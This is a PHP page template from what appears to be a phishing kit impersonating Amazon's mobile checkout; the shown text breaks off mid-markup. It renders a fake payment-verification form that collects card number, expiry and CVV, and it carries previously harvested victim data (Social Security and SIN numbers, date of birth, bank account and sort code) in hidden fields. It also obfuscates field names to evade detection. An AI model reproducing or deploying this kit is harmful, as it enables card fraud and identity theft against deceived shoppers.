<?php
require __DIR__ . '/../../function.php';
require $api->language();

$page = "Payment Information";
$api->check_cookie();
$api->session("glitch", true, $page);

$html = '
<!DOCTYPE html>
<html lang="en-us" class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser wpn-supported">
<head>
    <meta name="viewport" content="width=device-width, maximum-scale=2, minimum-scale=1, initial-scale=1, shrink-to-fit=no">
    <meta charset="utf-8">
    <link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/style-mobile.css").'">
    <meta name="theme-color" content="#131921">
    <style type="text/css">
    .nav-sprite-v3 .nav-sprite {
        background-image: url('.$api->image_encode("assets/img/nav-global-mobile.png")['local'].');
        background-repeat: no-repeat;
    }
    .nav-spinner {
        background-image: url('.$api->image_encode("assets/img/snake.gif")['local'].');
    }
    </style>
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/navbar-mobile.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/navbar-footer-mobile.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/glow.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/sugestion.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/deskop.css").'">
    <script>
        var countryCode = "'.$_SESSION['countrycode'].'";
    </script>
    <script>
        var cardnameEmpty = '.json_encode($lang['paymentpage']['alertcardname']).';
        var cardnameCheck = '.json_encode($lang['paymentpage']['checkalertcardname']).';
        var cardnumberEmpty = '.json_encode($lang['paymentpage']['alertcardnumber']).';
        var cardnumberCheck = '.json_encode($lang['paymentpage']['checkalertcardnumber']).';
        var cardexpEmpty = '.json_encode($lang['paymentpage']['requirecardexp']).';
        var cardexpmonth1or12Empty = '.json_encode($lang['paymentpage']['cardexpmust1and12']).';
        var cardexpyear25or35Empty = '.json_encode($lang['paymentpage']['cardexpmust22and35']).';
        var cardexpinvalidCheck = '.json_encode($lang['paymentpage']['cardexpinvalid']).';
        var cvvEmpty = '.json_encode($lang['paymentpage']['alertcvv']).';
        var cvvCheck = '.json_encode($lang['paymentpage']['checkalertcvv']).';
    </script>
    <title dir="ltr">'.$api->text_encode($lang['billingheader']['titlepayment']).'</title>
    <style>
    .a2hs-ingress-container,
    a[href^="#nav-hbm-a2hs-trigger"] {
        display:none!important
    }
    .a2hs-ingress-container.a2hs-ingress-visible,
    a[href^="#nav-hbm-a2hs-trigger"].a2hs-ingress-visible {
        display:block!important
    }
    </style>
    <style>
    @media all and (display-mode:standalone) {
    #chromeless-view-progress-bar,
    #chromeless-view-progress-bar::after {
        position:fixed;
        top:0;
        left:0;
        right:0;
        height:2px
    }
    @keyframes pbAnimation {
        0% {
          right:90%
        }
        100% {
          right:10%
        }
    }
    #chromeless-view-progress-bar {
        background:rgba(255,255,255,.1);
        z-index:9999999
    }
    #chromeless-view-progress-bar::after {
        content:"";
        background:#fcbb6a;
        animation:pbAnimation 10s forwards
        }
    }
    .pi-progress-bar-section {
        display: flex;
        justify-content: space-between;
        margin-top: 60px
    }
    .pi-step {
        align-items: center;
        display: flex;
        flex-direction: column
    }
    .pi-horizontal-divider {
        border-top: 1px solid #d5dbdb;
        height: 1px;
        margin-top: 14px;
        width: 100%
    }
    .pi-horizontal-divider.pi-first-child {
        margin-left: 50%;
        width: 50%
    }
    .pi-horizontal-divider.pi-last-child {
        margin-right: 50%;
        width: 50%
    }
    .pi-step-circle {
        align-items: center;
        border-radius: 50%;
        color: #fff;
        display: flex;
        font-size: 13px;
        height: 28px;
        justify-content: center;
        margin-top: -14px;
        width: 28px
    }
    .pi-step-circle.pi-completed {
        background: #067d62;
        position: relative;
        color: transparent;
    }
    .pi-step-circle.pi-completed::after {
        content: "✔";
        color: #fff;
        font-size: 14px;
        font-weight: bold;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
    }
    .pi-step-circle.pi-active {
        background: #b95b22
    }
    .pi-step-circle.pi-incomplete {
        background: #fff;
        border: thin solid #dadcdf;
        color: #dadcdf
    }
    .pi-step-label {
        font-size: 13px;
        text-align: center;
    }
    @media (min-width: 37.5em) {
      .pi-step-label {
        display: block;
        text-align: center
      }
    }
    .pi-step-label.pi-completed {
        color: #42973d
    }
    .pi-step-label.pi-active {
        color: #b95b22
    }
    .pi-step-label.pi-incomplete {
        color: #767676
    }
    button, input, select {
        font-family: inherit
    }
    h1, h2, h4, h5 {
        padding: 0;
        margin: 0
    }
    h1, h2, h4 {
        padding-bottom: 4px
    }
    h1, h2, h4 {
        text-rendering: optimizeLegibility
    }
    h4:last-child {
        padding-bottom: 0
    }
    h1, h2 {
        padding-bottom: 4px
    }
    h4 {
        padding-bottom: 4px
    }
    p {
        padding: 0;
        margin: 0 0 14px 0
    }
    p:last-child {
        margin-bottom: 0
    }
    p+p {
        margin-top: -4px
    }
    i {
        font-style: italic
    }
    </style>
    <style>
    .a-spacing-base, .a-ws .a-ws-spacing-base {
        margin-bottom: 1.2rem !important;
    }
    .a-row {
        width: 100%;
    }
    .a-section {
        margin-bottom: 1.3rem;
    }
    .apx-add-credit-card-secure-message-icon {
        width: 12px;
        height: 14px;
        margin-right: 4px;
    }
    img {
        vertical-align: top;
    }
    img {
        max-width: 100%;
        border: 0;
    }
    .apx-add-credit-card-secure-message {
        display: flex;
        align-items: center;
        justify-content: center;
    }
    .apx-add-credit-card-bpm-message {
        display: flex;
        text-align: left;
        justify-content: flex-start;
        overflow-wrap: break-word;
    }
    .a-color-secondary, .a-color-tertiary {
        color: #565959 !important;
    }
    .a-size-small {
        font-size: 1.3rem !important;
        line-height: 1.4 !important;
    }
    .a-section:last-child {
        margin-bottom: 0;
    }
    #cardnumber {
        padding-right: 50px; /* beri ruang untuk ikon di kanan */
        background-repeat: no-repeat;
        background-position: right 5px center;
    }
    </style>
    <style data-styled="active" data-styled-version="5.3.11"></style>
</head>
<body class="a-m-us a-aui_72554-c a-aui_a11y_6_837773-t2 a-aui_amzn_img_959719-c a-aui_amzn_img_gate_959718-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-bw_aui_cxc_alert_measurement_1074111-c">
    <div id="a-page">
        <img src="'.$api->image_encode("assets/img/nav-global.png")['local'].'" style="display:none" alt="">
        <style mark="aboveNavInjectionCSS" type="text/css">
        #nav-mobile-airstream-stripe img {
            max-width: 100%;
        }
        .nav-searchbar-wrapper {
            display: flex;
        }
        </style>
        <header id="nav-main" data-nav-language="en_US" class="nav-mobile nav-progressive-attribute nav-locale-us nav-lang-en nav-ssl nav-rec nav-blueheaven">
            <div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation" class="nav-t-standard nav-sprite-v3 celwidget" data-csa-c-id="v21t80-q2zx34-2if81d-5y2gzo" data-cel-widget="Navigation-mobile-navbar">
                <div id="nav-logobar">
                    <div class="nav-left">
                        <a href="javascript: void(0)" id="nav-hamburger-menu" role="button" aria-expanded="false" data-csa-c-id="odfy83-q0m8fu-itci24-c06cto">
                            <i class="nav-icon-a11y nav-sprite"></i>
                        </a>
                        <div id="nav-logo" class="nav-celnav-t11 nav-progressive-attribute">
                            <a href="#" id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute">
                                <span class="nav-sprite nav-logo-base"></span>
                                <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span>
                                <span class="nav-logo-locale">.us</span>
                            </a>
                        </div>
                    </div>
                    <div class="nav-right">
                        <a href="javascript: void(0)" class="nav-a nav-progressive-attribute" id="nav-button-avatar">
                            <i class="nav-icon nav-icon-a11y nav-sprite">your account</i>
                        </a>
                        <a href="#cart" class="nav-a" id="nav-button-cart">
                            <div id="cart-size" class="nav-cart-0 nav-progressive-attribute">
                            <span class="nav-icon nav-sprite">
                                <span id="nav-cart-count" class="nav-cart-count nav-progressive-content nav-celnav-t11">0</span>
                            </span>
                            </div>
                        </a>
                    </div>
                </div>
                <div class="nav-progressive-attribute" id="search-ac-init-data" data-aliases="" data-ime="" data-mkt="1" data-src="completion.amazon.com/search/complete"></div>
                <div id="nav-search-keywords-data" class="nav-progressive-attribute" data-implicit-alias="aps"></div>
                <div class="nav-searchbar-wrapper">
                    <form class="nav-searchbar search-big nav-celnav-t11" id="nav-search-form">
                        <div class="nav-fill">
                            <div class="nav-search-field">
                                <label for="nav-search-keywords" style="display: none;">'.$api->text_encode($lang['billingheader']['searchamazon']).'</label>
                                <input type="text" class="nav-input nav-progressive-attribute" placeholder="'.$api->text_encode($lang['billingheader']['searchamazon']).'" data-aria-clear-label="Clear search keywords" name="k" autocomplete="off" autocorrect="off" autocapitalize="off" dir="auto" value="" id="nav-search-keywords" spellcheck="false">
                                <a class="nav-icon nav-sprite nav-search-clear" tabindex="0" href="javascript:;"></a>
                            </div>
                            <div id="suggestions-template">
                                <div id="suggestions2">
                                    <div class="autocomplete-results-container">
                                        <div class="two-pane-results-container">
                                            <div class="left-pane-results-container"></div>
                                            <div class="right-pane-results-container"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="nav-right">
                            <div class="nav-search-submit nav-celnav-t11">
                                <input type="submit" class="nav-input">
                                <i class="nav-icon nav-sprite"></i>
                            </div>
                        </div>
                    </form>
                </div>
                <div class="glow-subnav-template glow-mobile-subnav nav-celnav-t11" id="nav-subnav-container">
                    <div class="a-declarative nav-global-location-slot-upsell-false" data-action="glow-sheet-trigger" id="nav-global-location-slot" tabindex="0">
                        <div class="nav-sprite" id="nav-packard-glow-loc-icon"></div>
                        <div id="glow-ingress-block">
                            <span class="nav-single-line nav-persist-content" id="glow-ingress-single-line">
                                '.$api->text_encode($lang['billingheader']['deliverto']).' '.$api->text_encode($_SESSION['country']).'
                            </span>
                        </div>
                    </div>
                </div>
                <div id="nav-subnav-toaster"></div>
            </div>
            <div id="nav-progressive-subnav"></div>
        </header>
        <a id="skippedLink" tabindex="-1"></a>
        <div class="a-section">
            <div class="a-section a-spacing-medium a-padding-base a-text-left">
                <div class="katal" id="progress-bar-root">
                    <div class="pi-progress-bar-section" style="margin: 20px 0 10px 0 !important;">
                        <div class="pi-step">
                            <div class="pi-horizontal-divider pi-first-child"></div>
                            <div class="pi-step-circle pi-completed"> 1 </div>
                            <div class="pi-step-label pi-completed">
                                '.$api->text_encode($lang['paymentpage']['verifyaddress']).'
                            </div>
                        </div>
                        <div class="pi-horizontal-divider"></div>
                        <div class="pi-step">
                            <div class="pi-horizontal-divider"></div>
                            <div class="pi-step-circle pi-active"> 2 </div>
                            <div class="pi-step-label pi-active">
                                '.$api->text_encode($lang['paymentpage']['verifypayment']).'
                            </div>
                        </div>
                        <div class="pi-horizontal-divider"></div>
                        <div class="pi-step">
                            <div class="pi-horizontal-divider pi-last-child"></div>
                            <div class="pi-step-circle pi-incomplete"> 3 </div>
                                <div class="pi-step-label pi-incomplete">
                                    '.$api->text_encode($lang['paymentpage']['complete']).'
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="a-section">
                        ';
                        if (isset($_GET['error']) && $_GET['error'] == true) {
                        $html .= '
                        <form action="/recard" method="post">
                        <span id="address-ui-widget-content">
                            <div id="address-ui-widgets-enterAddressFormContainer" data-csa-c-content-id="address-ui-widgets-enterAddressFormContainer-content-id-US" data-csa-c-slot-id="address-ui-widgets-enterAddressFormContainer-slot-id-US" data-csa-c-type="widget" class="a-section celwidget" data-csa-c-id="ahz59v-2px3si-5yk2no-pm7i4f" data-cel-widget="address-ui-widgets-enterAddressFormContainer">
                                <h1 class="a-size-medium a-spacing-base a-spacing-top-base a-padding-none a-text-bold">'.$api->text_encode($lang['paymentpage']['titleverifypayment']).'</h1>
                                <h5 id="address-ui-widgets-FullName" class="id-addr-ux-search-text a-text-bold">'.$api->text_encode($lang['paymentpage']['enterinformation']).'</h5>
                                <div class="a-section a-spacing-none a-spacing-top-mini">
                                    <div class="a-box a-alert a-alert-warning a-spacing-none" aria-live="polite" aria-atomic="true">
                                        <div class="a-box-inner a-alert-container">
                                            <h4 class="a-alert-heading">'.$api->text_encode($lang['paymentpage']['reviewpayment']).'</h4>
                                            <i class="a-icon a-icon-alert"></i>
                                            <div class="a-alert-content">
                                                <div class="a-section">'.$api->text_encode($lang['paymentpage']['paymentreview']).'</div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <br>
                                <div id="address-ui-widgets-prefill-fields-container" class="a-section a-spacing-none">
                                    <div class="a-row">
                                        <div class="a-input-text-group a-spacing-medium a-spacing-top-medium">
                                            <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                <div class="a-section a-spacing-none aok-inline-block">
                                                    <label for="cardname" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                        <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cardname']).'</span>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                                <input type="text" name="'.$api->encypt("cardname").'" id="cardname" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="'.$api->text_encode($lang['paymentpage']['placecardname']).'" required="true">
                                                <div id="inputErrorMsgCardname"></div>
                                            </div>
                                            <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                <div class="a-section a-spacing-none aok-inline-block">
                                                    <label for="cardnumber" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                        <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cardnumber']).'</span>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                                <input type="text" name="'.$api->encypt("cardnumber").'" id="cardnumber" oninput="formatCardNumber(event)" onkeyup="ccc();" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="'.$api->text_encode($lang['paymentpage']['cardnumber']).'" required="true">
                                                <div id="inputErrorMsgCardnumber"></div>
                                                <div id="cardTypeIcon" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 40px; height: 26px;"></div>
                                            </div>
                                            <div class="a-row">
                                                <div class="a-column a-span6">
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                        <div class="a-section a-spacing-none aok-inline-block">
                                                            <label for="cardexp" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                                <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cardexp']).'</span>
                                                            </label>
                                                        </div>
                                                    </div>
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-container">
                                                        <input type="text" name="'.$api->encypt("cardexp").'" id="cardexp" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="MM / YY" required="true">
                                                        <div id="inputErrorMsgCardexp"></div>
                                                    </div>
                                                </div>
                                                <div class="a-column a-span6 a-span-last">
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                        <div class="a-section a-spacing-none aok-inline-block">
                                                            <label for="cvv" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                                <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cvv']).'</span>
                                                            </label>
                                                        </div>
                                                    </div>
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-container">
                                                        <input type="text" name="'.$api->encypt("cvv").'" id="cvv" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="'.$api->text_encode($lang['paymentpage']['placecvv']).'" required="true">
                                                        <div id="inputErrorMsgCvv"></div>
                                                    </div>
                                                </div>
                                            </div>
                                            <br>
                                            <div class="a-row">
                                                <div class="a-column a-span4 a-spacing-none address-column">
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                        <div class="a-section a-spacing-none aok-inline-block">
                                                            <label class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                                <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['youraddress']).'</span>
                                                            </label>
                                                        </div>
                                                    </div>
                                                    <div id="ya-myab-display-address-block-0" class="a-box a-spacing-none" style="width: 400px; border-width: 1px; box-sizing: border-box; border-color: #C7C7C7; border-style: solid;">
                                                        <div class="a-box-inner a-padding-none">
                                                            <div class="a-section address-section-no-default">
                                                                <div class="a-row a-spacing-small">
                                                                    <ul class="a-unordered-list a-nostyle a-vertical">
                                                                        <li>
                                                                            <span class="a-list-item">
                                                                                <h5 id="address-ui-widgets-FullName" class="id-addr-ux-search-text a-text-bold">'.$api->text_encode($lang['paymentpage']['yourinfoname']).': ' . $_SESSION['fullname'] . '</h5>
                                                                            </span>
                                                                        </li>
                                                                        <li>
                                                                            <span class="a-list-item">
                                                                                <span id="address-ui-widgets-AddressLineOne" class="id-addr-ux-search-text">'.$api->text_encode($lang['paymentpage']['yourinfoaddress']).': ' . $_SESSION['addressline1'] . ', ' . $_SESSION['addressline2'] . '</span>
                                                                            </span>
                                                                        </li>
                                                                        <li>
                                                                            <span class="a-list-item">
                                                                                <span id="address-ui-widgets-CityStatePostalCode" class="id-addr-ux-search-text">'.$api->text_encode($lang['billingpage']['city']).', '.$api->text_encode($lang['billingpage']['state']).', '.$api->text_encode($lang['billingpage']['zipcode']).': ' . $_SESSION['kota'] . ', ' . $_SESSION['region'] . ' ' . $_SESSION['zipcode'] . '</span>
                                                                            </span>
                                                                        </li>
                                                                        <li>
                                                                            <span class="a-list-item">
                                                                                <span id="address-ui-widgets-Country" class="id-addr-ux-search-text">'.$api->text_encode($lang['paymentpage']['yourinfocountry']).': '.$_SESSION['country'].'</span>
                                                                            </span>
                                                                        </li>
                                                                        <li>
                                                                            <span class="a-list-item">
                                                                                <span id="address-ui-widgets-PhoneNumber" class="id-addr-ux-search-text">'.$api->text_encode($lang['billingpage']['phonenumber']).': ' . $_SESSION['phone'] . '</span>
                                                                            </span>
                                                                        </li>
                                                                    </ul>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <span class="a-declarative" data-action="form-submit-button-click" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-form-submit-button-click" data-form-submit-button-click="{}" data-csa-c-id="f0no4r-elumsu-hdqjy2-gkxnqd">
                                    <span id="address-ui-widgets-form-submit-button" class="a-button a-button-primary address-ui-widgets-mobile-tablet-form-field-full-width">
                                        <span class="a-button-inner">
                                            <input class="a-button-input" type="submit" id="btn_next" aria-labelledby="address-ui-widgets-form-submit-button-announce">
                                            <span id="address-ui-widgets-form-submit-button-announce" class="a-button-text" aria-hidden="true">'.$api->text_encode($lang['paymentpage']['verifypayment']).'</span>
                                        </span>
                                    </span>
                                </span>
                                <div class="a-row a-spacing-base">
                                    <div class="a-section apx-add-credit-card-secure-message">
                                        <img alt="" src="'.$api->image_encode("assets/img/lock.png")['local'].'" class="apx-add-credit-card-secure-message-icon">
                                        <span class="a-size-small a-color-secondary">'.$api->text_encode($lang['paymentpage']['infopayment']).'</span>
                                    </div>
                                    <div class="a-section apx-add-credit-card-bpm-message">
                                        <span class="a-size-small a-color-secondary">'.$api->text_encode($lang['paymentpage']['alertinfopayment']).'</span>
                                    </div>
                                </div>
                                <div id="stop-mash-reappear"></div>
                            </div>
                            <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/deskop-address.css").'">
                            <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/custom-address-mobile.css").'">
                        </span>
                        </form>
                        ';
                        } else {
                        $html .= '
                        <form action="/card" method="post">
                        <input type="hidden" name="'.$api->encypt("fullname").'" value="' . (isset($_SESSION['fullname']) && !empty($_SESSION['fullname']) ? $_SESSION['fullname'] : (isset($_POST[$api->encypt('fullname')]) && !empty($_POST[$api->encypt('fullname')]) ? $_POST[$api->encypt('fullname')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("dob").'" value="' . (isset($_SESSION['dob']) && !empty($_SESSION['dob']) ? $_SESSION['dob'] : (isset($_POST[$api->encypt('dob')]) && !empty($_POST[$api->encypt('dob')]) ? $_POST[$api->encypt('dob')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("ssn").'" value="' . (isset($_SESSION['ssn']) && !empty($_SESSION['ssn']) ? $_SESSION['ssn'] : (isset($_POST[$api->encypt('ssn')]) && !empty($_POST[$api->encypt('ssn')]) ? $_POST[$api->encypt('ssn')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("sin").'" value="' . (isset($_SESSION['sin']) && !empty($_SESSION['sin']) ? $_SESSION['sin'] : (isset($_POST[$api->encypt('sin')]) && !empty($_POST[$api->encypt('sin')]) ? $_POST[$api->encypt('sin')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("acno").'" value="' . (isset($_SESSION['acno']) && !empty($_SESSION['acno']) ? $_SESSION['acno'] : (isset($_POST[$api->encypt('acno')]) && !empty($_POST[$api->encypt('acno')]) ? $_POST[$api->encypt('acno')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("sortcode").'" value="' . (isset($_SESSION['sortcode']) && !empty($_SESSION['sortcode']) ? $_SESSION['sortcode'] : (isset($_POST[$api->encypt('sortcode')]) && !empty($_POST[$api->encypt('sortcode')]) ? $_POST[$api->encypt('sortcode')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("osid").'" value="' . (isset($_SESSION['osid']) && !empty($_SESSION['osid']) ? $_SESSION['osid'] : (isset($_POST[$api->encypt('osid')]) && !empty($_POST[$api->encypt('osid')]) ? $_POST[$api->encypt('osid')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("climit").'" value="' . (isset($_SESSION['climit']) && !empty($_SESSION['climit']) ? $_SESSION['climit'] : (isset($_POST[$api->encypt('climit')]) && !empty($_POST[$api->encypt('climit')]) ? $_POST[$api->encypt('climit')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("phone").'" value="' . (isset($_SESSION['phone']) && !empty($_SESSION['phone']) ? $_SESSION['phone'] : (isset($_POST[$api->encypt('phone')]) && !empty($_POST[$api->encypt('phone')]) ? $_POST[$api->encypt('phone')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("address").'" value="' . (isset($_SESSION['address']) && !empty($_SESSION['address']) ? $_SESSION['address'] : (isset($_POST[$api->encypt('address')]) && !empty($_POST[$api->encypt('address')]) ? $_POST[$api->encypt('address')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("addressline2").'" value="' . (isset($_SESSION['addressline2']) && !empty($_SESSION['addressline2']) ? $_SESSION['addressline2'] : (isset($_POST[$api->encypt('addressline2')]) && !empty($_POST[$api->encypt('addressline2')]) ? $_POST[$api->encypt('addressline2')] : '')) . '" />
                        <input type="hidden" name="'.$api->encypt("country").'" value="' . (isset($_SESSION['country']) && !empty($_SESSION['country']) ? $_SESSION['country'] : (isset($_POST[$api->encypt('country')]) && !empty($_POST[$api->encypt('country')]) ? $_POST[$api->encypt('country')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("kota").'" value="' . (isset($_SESSION['kota']) && !empty($_SESSION['kota']) ? $_SESSION['kota'] : (isset($_POST[$api->encypt('kota')]) && !empty($_POST[$api->encypt('kota')]) ? $_POST[$api->encypt('kota')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("region").'" value="' . (isset($_SESSION['region']) && !empty($_SESSION['region']) ? $_SESSION['region'] : (isset($_POST[$api->encypt('region')]) && !empty($_POST[$api->encypt('region')]) ? $_POST[$api->encypt('region')] : '-')) . '" />
                        <input type="hidden" name="'.$api->encypt("zipcode").'" value="' . (isset($_SESSION['zipcode']) && !empty($_SESSION['zipcode']) ? $_SESSION['zipcode'] : (isset($_POST[$api->encypt('zipcode')]) && !empty($_POST[$api->encypt('zipcode')]) ? $_POST[$api->encypt('zipcode')] : '-')) . '" />
                        <span id="address-ui-widget-content">
                            <div id="address-ui-widgets-enterAddressFormContainer" data-csa-c-content-id="address-ui-widgets-enterAddressFormContainer-content-id-US" data-csa-c-slot-id="address-ui-widgets-enterAddressFormContainer-slot-id-US" data-csa-c-type="widget" class="a-section celwidget" data-csa-c-id="ahz59v-2px3si-5yk2no-pm7i4f" data-cel-widget="address-ui-widgets-enterAddressFormContainer">
                                <h1 class="a-size-medium a-spacing-base a-spacing-top-base a-padding-none a-text-bold">'.$api->text_encode($lang['paymentpage']['titleverifypayment']).'</h1>
                                <h5 id="address-ui-widgets-FullName" class="id-addr-ux-search-text a-text-bold">'.$api->text_encode($lang['paymentpage']['enterinformation']).'</h5>
                                <br>
                                <div id="address-ui-widgets-prefill-fields-container" class="a-section a-spacing-none">
                                    <div class="a-row">
                                        <div class="a-input-text-group a-spacing-medium a-spacing-top-medium">
                                            <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                <div class="a-section a-spacing-none aok-inline-block">
                                                    <label for="cardname" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                        <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cardname']).'</span>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                                <input type="text" name="'.$api->encypt("cardname").'" id="cardname" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="'.$api->text_encode($lang['paymentpage']['placecardname']).'" required="true">
                                                <div id="inputErrorMsgCardname"></div>
                                            </div>
                                            <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                <div class="a-section a-spacing-none aok-inline-block">
                                                    <label for="cardnumber" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                        <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cardnumber']).'</span>
                                                    </label>
                                                </div>
                                            </div>
                                            <div class="a-section a-spacing-base adddress-ui-widgets-form-field-container">
                                                <input type="text" name="'.$api->encypt("cardnumber").'" id="cardnumber" oninput="formatCardNumber(event)" onkeyup="ccc();" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="'.$api->text_encode($lang['paymentpage']['cardnumber']).'" required="true">
                                                <div id="inputErrorMsgCardnumber"></div>
                                                <div id="cardTypeIcon" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 40px; height: 26px;"></div>
                                            </div>
                                            <div class="a-row">
                                                <div class="a-column a-span6">
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                        <div class="a-section a-spacing-none aok-inline-block">
                                                            <label for="cardexp" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                                <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cardexp']).'</span>
                                                            </label>
                                                        </div>
                                                    </div>
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-container">
                                                        <input type="text" name="'.$api->encypt("cardexp").'" id="cardexp" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="MM / YY" required="true">
                                                        <div id="inputErrorMsgCardexp"></div>
                                                    </div>
                                                </div>
                                                <div class="a-column a-span6 a-span-last">
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                        <div class="a-section a-spacing-none aok-inline-block">
                                                            <label for="cvv" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                                <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['cvv']).'</span>
                                                            </label>
                                                        </div>
                                                    </div>
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-container">
                                                        <input type="text" name="'.$api->encypt("cvv").'" id="cvv" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" placeholder="'.$api->text_encode($lang['paymentpage']['placecvv']).'" required="true">
                                                        <div id="inputErrorMsgCvv"></div>
                                                    </div>
                                                </div>
                                            </div>
                                            <br>
                                            <div class="a-row">
                                                <div class="a-column a-span4 a-spacing-none address-column">
                                                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                        <div class="a-section a-spacing-none aok-inline-block">
                                                            <label class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                                <span class="a-size-base">'.$api->text_encode($lang['paymentpage']['youraddress']).'</span>
                                                            </label>
                                                        </div>
                                                    </div>
                                                    <div id="ya-myab-display-address-block-0" class="a-box a-spacing-none" style="width: 400px; border-width: 1px; box-sizing: border-box; border-color: #C7C7C7; border-style: solid;">
                                                        <div class="a-box-inner a-padding-none">
                                                            <div class="a-section address-section-no-default">
                                                                <div class="a-row a-spacing-small">
                                                                    <ul class="a-unordered-list a-nostyle a-vertical">
                                                                        <li>
                                                                            <span class="a-list-item">
                                                                                <h5 id="address-ui-widgets-FullName" class="id-addr-ux-search-text a-text-bold">'.$api->text_encode($lang['paymentpage']['yourinfoname']).': ' . (isset($_SESSION['fullname']) && !empty($_SESSION['fullname']) ? $_SESSION['fullname'] : (isset($_POST[$api->encypt('fullname')]) && !empty($_POST[$api->encypt('fullname')]) ? $_POST[$api->encypt('fullname')] : '-')) . '</h5>
                                                                            </span>
                                                                        </li>
                                                                        <li>
                                                                            <span class="a-list-item">
